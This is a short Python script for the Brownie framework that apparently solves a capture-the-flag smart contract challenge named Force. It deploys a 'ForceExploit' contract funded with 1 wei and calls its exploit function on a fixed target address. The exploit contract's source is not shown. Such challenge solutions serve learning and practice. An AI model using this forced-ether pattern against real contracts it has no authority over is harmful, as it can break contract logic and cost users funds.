from brownie import Force,ForceExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0x7d5CDc07a7713E65576566A40F3368Cae9F3A4Cb'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    force = Force.at(contractAddress)
    destruct = ForceExploit.deploy({"from":player,"value":1})
    destruct.exploit(force.address)

def main():
    solution()
    